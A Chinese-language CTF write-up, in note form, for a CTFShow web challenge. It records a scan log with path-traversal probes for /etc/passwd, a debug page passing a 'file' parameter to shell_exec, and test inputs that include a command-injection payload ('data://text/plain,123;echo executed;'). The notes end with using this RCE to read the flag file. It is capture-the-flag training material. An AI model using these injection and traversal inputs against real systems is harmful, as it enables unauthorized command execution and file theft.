tags:: RCE

- 参考： [[CTF/WP/CTFSHow/web386]]
- # 施工中
	- 扫描，记录：
		- ```
		  [15:57:44] Starting: 
		  [15:57:47] 400 -  179B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
		  [16:01:54] 400 -  179B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
		  [16:02:30] 200 -   14B  - /debug/
		  [16:02:31] 301 -  169B  - /debug  ->  http://df491a5e-86a2-404d-a105-240aba66a015.challenge.ctf.show/debug/
		  [16:03:17] 301 -  169B  - /install  ->  http://df491a5e-86a2-404d-a105-240aba66a015.challenge.ctf.show/install/
		  [16:03:17] 200 -   59B  - /install/index.php?upgrade/
		  [16:03:17] 200 -   59B  - /install/
		  [16:04:13] 200 -   24B  - /page.php
		  [16:04:55] 200 -   15B  - /robots.txt
		  ```
	- 扫描发现`/debug/index.php`，其拥有GET参数`file`，可以实现^^文件读取^^
		- ~~貌似是任意^^include^^文件~~
			- 是`shell_exec('php -f '.$_GET['file']);`
		- 可能在会读取前检测文件是否存在
		- 测试：
			- `data://text/plain,123`：中文提示找不到文件
			- `data://text/plain,<?=123?>`：输出为空
			- `/proc/self/cwd/../index.php`：正常输出
			- `/proc/self/cwd/../debug/index.php`：提示`file not exist`，估计为执行出错
			- `<?=123?>`：输出为空
			- `"data://text/plain;base64," + enc_dec.base64_encode("<?=123?>")`：
				- 输出`Could not open input file: data://text/plain`
				- ????
			- `data://text/plain,123;echo executed;`：^^输出executed^^!!!!!!!
	- 所有值得注意的页面：
		- `/debug/index.php`
			- 任意文件读取
			- 会在读取前检测文件是否存在
			- 可能为`include$_GET["file"]`
		- `/install/index.php`
			- 如果检测到文件不存在则重置管理员密码
		- `/page.php`
		- `/alsckdfy/check.php`
			- 管理员登陆界面
- # WP
	- 扫描发现`/debug/index.php`，arjun扫描发现GET参数`file`
	- 测试发现`file`参数存在RCE
	- 利用RCE读取`/alsckdfy/check.php`得到flag